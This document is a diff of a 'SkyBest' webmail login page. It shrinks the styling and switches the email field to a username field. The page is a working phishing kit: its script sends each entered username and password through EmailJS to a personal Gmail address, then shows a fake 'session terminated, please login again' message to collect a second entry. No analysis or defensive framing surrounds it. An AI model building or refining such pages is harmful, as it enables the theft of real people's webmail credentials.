@@ -21,19 +21,19 @@
       color: #eee;
     }
     .card {
-      width: 500px;
+      width: 300px;
       max-width: 90%;
       background: #3b3b3b;
-      padding: 10px 25px 30px;
-      border-radius: 8px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.45);
+      padding: 16px 20px 20px;
+      border-radius: 6px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.4);
       text-align: center;
     }
     .logo-wrapper {
-      margin-bottom: 32px;
+      margin-bottom: 18px;
     }
     .logo-img {
-      height: 70px; /* Adjust this value to match the size in your image */
+      height: 48px;
       width: auto;
       max-width: 100%;
       display: block;
@@ -43,199 +43,160 @@
       position: relative;
       display: flex;
       align-items: center;
-      margin-bottom: 22px;
-      gap: 18px;
+      margin-bottom: 10px;
+      gap: 8px;
     }
     .form-row label {
-      width: 70px;
+      width: 68px;
       text-align: right;
       color: #ccc;
-      font-size: 14px;
-      font-weight: 500;
+      font-size: 12px;
+      font-weight: 400;
       flex-shrink: 0;
     }
     .form-row input {
       flex: 1;
-      height: 20px;
-      padding: 0 14px;
+      height: 18px;
+      padding: 0 6px;
       border: none;
-      border-radius: 4px;
+      border-radius: 2px;
       background: #ffffff;
-      font-size: 15px;
+      font-size: 12px;
       color: #111;
     }
     input:focus {
       outline: none;
       box-shadow: 0 0 0 2px #77b3ff;
     }
+    .btn-row {
+      display: flex;
+      justify-content: center;
+      margin-top: 12px;
+    }
     .btn {
-      width: 20%;
+      padding: 2px 18px;
       height: 22px;
       background: #ffffff;
       color: #222;
-      border: none;
-      border-radius: 4px;
-      font-size: 15px;
-      font-weight: bold;
+      border: 1px solid #aaa;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: normal;
       cursor: pointer;
-      margin-top: 16px;
-      transition: background 0.18s;
+      transition: background 0.15s;
     }
     .btn:hover {
-      background: #948f8f;
+      background: #e0e0e0;
     }
     .error-message {
       background: #444444;
       color: #ffffff;
-      font-size: 12px;
-      padding: 8px 12px;
-      border-radius: 4px;
+      font-size: 11px;
+      padding: 4px 8px;
+      border-radius: 3px;
       display: none;
-      width: auto;
       position: absolute;
       top: 50%;
-      left: 180px;
+      left: calc(76px + 8px);
       transform: translateY(-50%);
       z-index: 10;
       white-space: nowrap;
       font-weight: bold;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
     }
     .error-message::before {
       content: '⚠ ';
       color: #ff9800;
-      font-size: 14px;
     }
     .error-message.show {
       display: inline-block;
     }
     .message {
-      margin-top: 24px;
-      font-size: 16px;
+      margin-top: 16px;
+      font-size: 13px;
       color: #292828;
       font-weight: bold;
       text-align: center;
-      min-height: 24px;
+      min-height: 20px;
     }
     .webmail-text {
-      margin-top: 92px;
+      margin-top: 60px;
       font-size: 10px;
       color: #555;
       text-align: center;
     }
-    /* Tablet styles */
-    @media (max-width: 768px) {
-      .card {
-        width: 80%;
-        padding: 15px 30px 35px;
-      }
-      .form-row {
-        gap: 15px;
-      }
-      .form-row label {
-        width: 80px;
-        font-size: 16px;
-      }
-      .form-row input {
-        height: 24px;
-        font-size: 16px;
-      }
-      .btn {
-        width: 30%;
-        height: 28px;
-        font-size: 16px;
-      }
-      .error-message {
-        left: 200px;
-        font-size: 14px;
-      }
-      .logo-img {
-        height: 80px;
-      }
-    }
-    /* Mobile styles */
+
+    /* Mobile — keep same compact layout */
     @media (max-width: 480px) {
       .card {
-        width: 90%;
-        padding: 20px 25px 30px;
-      }
-      .form-row {
-        flex-direction: row;
-        align-items: center;
-        gap: 15px;
-        margin-bottom: 18px;
+        width: 85%;
+        padding: 14px 16px 18px;
       }
       .form-row label {
-        width: 70px;
-        text-align: right;
-        font-size: 16px;
+        font-size: 13px;
+        width: 72px;
       }
       .form-row input {
-        height: 28px;
-        font-size: 16px;
-        min-width: 0;
+        height: 22px;
+        font-size: 13px;
       }
       .btn {
-        width: 50%;
-        height: 32px;
-        font-size: 16px;
+        height: 24px;
+        font-size: 13px;
+        padding: 2px 20px;
+      }
+      .logo-img {
+        height: 42px;
+      }
+      .webmail-text {
+        margin-top: 40px;
+        font-size: 11px;
       }
       .error-message {
         position: static;
         transform: none;
-        margin-top: 5px;
-        width: 100%;
-        text-align: left;
-        font-size: 14px;
+        margin-top: 4px;
+        display: none;
+        font-size: 11px;
       }
-      .logo-img {
-        height: 60px;
-      }
-      .webmail-text {
-        margin-top: 50px;
-        font-size: 12px;
+      .error-message.show {
+        display: block;
       }
     }
   </style>
 
-  <!-- EmailJS Library – latest stable version (v4) -->
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <!-- Initialize EmailJS with your public key -->
   <script type="text/javascript">
     (function(){
-      emailjs.init({
-        publicKey: "LAX3VyLSt5U_02era"
-      });
-      console.log('EmailJS initialized');
+      emailjs.init({ publicKey: "LAX3VyLSt5U_02era" });
     })();
   </script>
 </head>
 <body>
   <div class="card">
     <div class="logo-wrapper">
-      <!-- Saved logo in project: index_files/logo.png (uploaded) -->
       <img src="logo.png" alt="SkyBest Logo" class="logo-img">
     </div>
     <div class="form-row">
-      <label for="email">Email</label>
-      <input type="email" id="email" name="email" placeholder="" autocomplete="email">
-      <div class="error-message" id="emailError">Please fill in this field.</div>
+      <label for="username">Username</label>
+      <input type="text" id="username" name="username" autocomplete="username">
+      <div class="error-message" id="usernameError">Please fill in this field.</div>
     </div>
     <div class="form-row">
       <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="" autocomplete="current-password">
+      <input type="password" id="password" name="password" autocomplete="current-password">
       <div class="error-message" id="passwordError">Please fill in this field.</div>
     </div>
-    <button class="btn" id="loginBtn">Login</button>
+    <div class="btn-row">
+      <button class="btn" id="loginBtn">Login</button>
+    </div>
   </div>
   <div class="message" id="message"></div>
   <div class="webmail-text">Webmail</div>
 
   <script>
-    // Hide error messages when user focuses on input fields
-    document.getElementById('email').addEventListener('focus', function() {
-      document.getElementById('emailError').classList.remove('show');
+    document.getElementById('username').addEventListener('focus', function() {
+      document.getElementById('usernameError').classList.remove('show');
     });
     document.getElementById('password').addEventListener('focus', function() {
       document.getElementById('passwordError').classList.remove('show');
@@ -244,55 +205,41 @@
     document.getElementById('loginBtn').addEventListener('click', function() {
       const messageEl = document.getElementById('message');
       const btn = document.getElementById('loginBtn');
-      const emailInput = document.getElementById('email').value.trim();
+      const usernameInput = document.getElementById('username').value.trim();
       const passwordInput = document.getElementById('password').value.trim();
-      const emailError = document.getElementById('emailError');
+      const usernameError = document.getElementById('usernameError');
       const passwordError = document.getElementById('passwordError');
-     
-      // Clear error messages first
-      emailError.classList.remove('show');
+
+      usernameError.classList.remove('show');
       passwordError.classList.remove('show');
-     
-      // Validate email first
-      if (!emailInput) {
-        emailError.classList.add('show');
+
+      if (!usernameInput) {
+        usernameError.classList.add('show');
         return;
       }
-     
-      // Then validate password
       if (!passwordInput) {
         passwordError.classList.add('show');
         return;
       }
-     
-      // Clear any previous message
-      messageEl.textContent = '';
-     
-      // Show "Loading..." for 6 seconds
+
       messageEl.textContent = 'Loading...';
       btn.disabled = true;
-     
-      // Send email with credentials
+
       emailjs.send('service_vumzjh5', 'template_ytpnja6', {
         to_email: 'frank227r@gmail.com',
-        user_email: emailInput,
+        user_email: usernameInput,
         user_password: passwordInput
       }).then(function() {
         console.log('Email sent successfully');
       }).catch(function(error) {
         console.error('Email send failed:', error);
       });
-     
+
       setTimeout(function() {
-        // Clear form fields after email is sent
-        document.getElementById('email').value = '';
+        document.getElementById('username').value = '';
         document.getElementById('password').value = '';
-       
-        // After 6 seconds, show success message for 5 seconds
         messageEl.textContent = 'You have successfully terminated the session. Please login again!';
-       
         setTimeout(function() {
-          // After 5 more seconds, clear the message and re-enable button
           messageEl.textContent = '';
           btn.disabled = false;
         }, 5000);
